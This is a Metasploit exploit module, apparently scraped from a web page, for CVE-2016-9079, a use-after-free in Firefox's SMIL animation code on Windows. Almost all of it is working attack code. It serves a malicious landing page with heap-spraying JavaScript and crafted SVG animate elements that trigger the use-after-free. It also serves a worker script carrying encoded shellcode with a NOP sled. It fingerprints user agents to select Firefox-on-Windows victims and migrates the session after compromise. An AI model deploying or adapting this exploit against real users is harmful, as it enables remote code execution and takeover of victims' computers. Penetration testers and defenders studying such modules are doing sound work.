# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

  class MetasploitModule < Msf::Exploit::Remote
    Rank = NormalRanking

    include Msf::Exploit::Remote::HttpServer

    def initialize(info={})
      super(update_info(info,
        &#039;Name&#039;           => "Firefox nsSMILTimeContainer::NotifyTimeChange() RCE",
        &#039;Description&#039;    => %q{
          nsSMILTimeContainer::NotifyTimeChange() across numerous versions of Mozilla Firefox
          on Microsoft Windows.
          },
          &#039;License&#039;        => MSF_LICENSE,
          &#039;Author&#039;         =>
          [
            &#039;Anonymous Gaijin&#039;,                                 # Original research/exploit
            &#039;William Webb <william_webb[at]rapid7.com>&#039;         # Metasploit module
          ],
          &#039;Platform&#039;       => &#039;win&#039;,
          &#039;Targets&#039;        =>
          [
            [ &#039;Mozilla Firefox&#039;,
              {
                &#039;Platform&#039; => &#039;win&#039;,
                &#039;Arch&#039;     => ARCH_X86,
              }
            ],
          ],
          &#039;DefaultOptions&#039;  =>
          {
            &#039;EXITFUNC&#039; => "thread",
            &#039;InitialAutoRunScript&#039; => &#039;migrate -f&#039;
          },
          &#039;References&#039;     =>
          [
            [ &#039;CVE&#039;, &#039;2016-9079&#039; ],
            [ &#039;Bugzilla&#039;, &#039;1321066&#039; ]
          ],
          &#039;Arch&#039;           => ARCH_X86,
          &#039;DisclosureDate&#039; => "Nov 30 2016",
          &#039;DefaultTarget&#039;  => 0
        )
      )
    register_options(
      [
        OptBool.new(&#039;UsePostHTML&#039;, [ true, &#039;Rewrite page with arbitrary HTML after successful exploitation.  NOTE: if set to true, you should probably rewrite data/exploits/ff_smil_uaf/post.html to something useful!&#039;, false ]),
      ], self.class
    )
  end

  def exploit_html(cli)
    p = payload.encoded
    arch = Rex::Arch.endian(target.arch)
    base_uri = "#{get_resource.chomp(&#039;/&#039;)}"

    # stuff that gets adjusted alot during testing

    defrag_x = %Q~
       for (var i = 0; i < 0x4000; i++)
         heap80[i] = block80.slice(0)
     ~
     defrag_y = %Q~
       for (var i = 0x4401; i < heap80.length; i++)
         heap80[i] = block80.slice(0)
     ~

    js = %Q~
    var worker = new Worker(&#039;#{base_uri}/worker.js&#039;);
    var svgns = &#039;http://www.w3.org/2000/svg&#039;;
    var heap80 = new Array(0x5000);
    var heap100 = new Array(0x5000);
    var block80 = new ArrayBuffer(0x80);
    var block100 = new ArrayBuffer(0x100);
    var sprayBase = undefined;
    var arrBase = undefined;

    var animateX = undefined;
    var containerA = undefined;

    var milestone_offset = 0x90;

    var $ = function(id) { return document.getElementById(id); }

    var heap = function()
    {
     var u32 = new Uint32Array(block80)

     u32[4] = arrBase - milestone_offset;

     u32[0xa] = arrBase + 0x1000 - milestone_offset;

     u32[0x10] = arrBase + 0x2000 - milestone_offset;

     var x = document.createElementNS(svgns, &#039;animate&#039;)
     var svg = document.createElementNS(svgns, &#039;svg&#039;)

     svg.appendChild(x)
     svg.appendChild(x.cloneNode(true))

     for (var i = 0; i < 0x400; i++)
       {
         var node = svg.cloneNode(true);
         node.setAttribute(&#039;id&#039;, &#039;svg&#039; + i)
         document.body.appendChild(node);
       }
       #{defrag_x}

       for (var i = 0; i < 0x400; i++)
         {
           heap80[i + 0x3000] = block80.slice(0)
           $(&#039;svg&#039; + i).appendChild(x.cloneNode(true))
         }

         for (var i = 0; i < 0x400; i++)
           {
             $(&#039;svg&#039; + i).appendChild(x.cloneNode(true))
             $(&#039;svg&#039; + i).appendChild(x.cloneNode(true))
           }

           for (var i = 0; i < heap100.length; i++)
             heap100[i] = block100.slice(0)

             #{defrag_y}

             for (var i = 0x100; i < 0x400; i++)
               $(&#039;svg&#039; + i).appendChild(x.cloneNode(true))
             }

             var exploit = function()
             {
               heap();

               animateX.setAttribute(&#039;begin&#039;, &#039;59s&#039;)
               animateX.setAttribute(&#039;begin&#039;, &#039;58s&#039;)
               animateX.setAttribute(&#039;begin&#039;, &#039;10s&#039;)
               animateX.setAttribute(&#039;begin&#039;, &#039;9s&#039;)

               // money shot

               containerA.pauseAnimations();
             }

             worker.onmessage = function(e)
             {
              worker.onmessage = function(e)
              {
               window.setTimeout(function()
               {
                 worker.terminate();
                 document.body.innerHTML = &#039;&#039;;
                 document.getElementsByTagName(&#039;head&#039;)[0].innerHTML = &#039;&#039;;
                 document.body.setAttribute(&#039;onload&#039;, &#039;&#039;)
                 document.write(&#039;<blink>&#039;)
                 }, 1000);
  }

  arrBase = e.data;
  exploit();
  }


  var idGenerator = function()
  {
   return &#039;id&#039; + (((1+Math.random())*0x10000)|0).toString(16).substring(1);
  }


  var craftDOM = function()
  {
   containerA = document.createElementNS(svgns, &#039;svg&#039;)
   var containerB = document.createElementNS(svgns, &#039;svg&#039;);

   animateX = document.createElementNS(svgns, &#039;animate&#039;)
   var animateA = document.createElementNS(svgns, &#039;animate&#039;)
   var animateB = document.createElementNS(svgns, &#039;animate&#039;)

   var animateC = document.createElementNS(svgns, &#039;animate&#039;)

   var idX = idGenerator();
   var idA = idGenerator();
   var idB = idGenerator();
   var idC = idGenerator();

   animateX.setAttribute(&#039;id&#039;, idX);
   animateA.setAttribute(&#039;id&#039;, idA);
   animateA.setAttribute(&#039;end&#039;, &#039;50s&#039;);
   animateB.setAttribute(&#039;id&#039;, idB);
   animateB.setAttribute(&#039;begin&#039;, &#039;60s&#039;);
   animateB.setAttribute(&#039;end&#039;, idC + &#039;.end&#039;);
   animateC.setAttribute(&#039;id&#039;, idC);
   animateC.setAttribute(&#039;begin&#039;, &#039;10s&#039;);
   animateC.setAttribute(&#039;end&#039;, idA + &#039;.end&#039;);

   containerA.appendChild(animateX)
   containerA.appendChild(animateA)
   containerA.appendChild(animateB)

   containerB.appendChild(animateC)

   document.body.appendChild(containerA);
   document.body.appendChild(containerB);
  }
  window.onload = craftDOM;
    ~

    # If you want to change the appearance of the landing page, do it here

    html = %Q~
    <html>
    <head>
    <meta charset="utf-8"/>
    <script>
    #{js}
    </script>
    </head>
    <body>
    </body>
    </html>
    ~

    if datastore[&#039;UsePostHTML&#039;]
      f = File.open(File.join(Msf::Config.data_directory, "exploits", "firefox_smil_uaf", "post.html"), "rb")
      c = f.read
      html = html.gsub("<blink>", c)
    else
      html = html.gsub("<blink>", "")
    end
    send_response(cli, html, { &#039;Content-Type&#039; => &#039;text/html&#039;, &#039;Pragma&#039; => &#039;no-cache&#039;, &#039;Cache-Control&#039; => &#039;no-cache&#039;, &#039;Connection&#039; => &#039;close&#039; })
  end

  def worker_js(cli)
    p = payload.encoded
    arch = Rex::Arch.endian(target.arch)
    payload = Rex::Text.to_unescape(p, arch)
    wt = File.open(File.join(Msf::Config.data_directory, "exploits", "firefox_smil_uaf", "worker.js"), "rb")
    c = wt.read
    c = c.gsub("INSERTSHELLCODEHEREPLZ", payload)
    c = c.gsub("NOPSGOHERE", "\u9090")
    send_response(cli, c, { &#039;Content-Type&#039; => &#039;application/javascript&#039;, &#039;Pragma&#039; => &#039;no-cache&#039;, &#039;Cache-Control&#039; => &#039;no-cache&#039;, &#039;Connection&#039; => &#039;close&#039; })
  end

  def is_ff_on_windows(user_agent)
    target_hash = fingerprint_user_agent(user_agent)
    if target_hash[:ua_name] !~ /Firefox/ or target_hash[:os_name] !~ /Windows/
      return false
    end
      return true
  end

  def on_request_uri(cli, request)
    print_status("Got request: #{request.uri}")
    print_status("From: #{request.headers[&#039;User-Agent&#039;]}")
    if (!is_ff_on_windows(request.headers[&#039;User-Agent&#039;]))
      print_error("Unsupported user agent: #{request.headers[&#039;User-Agent&#039;]}")
      send_not_found(cli)
      close_client(cli)
      return
    end
    if request.uri =~ /worker\.js/
      print_status("Sending worker thread Javascript ...")
      worker_js(cli)
      return
    end
    if request.uri =~ /index\.html/ or request.uri =~ /\//

      print_status("Sending exploit HTML ...")
      exploit_html(cli)
      close_client(cli)
      return
    end
  end
end

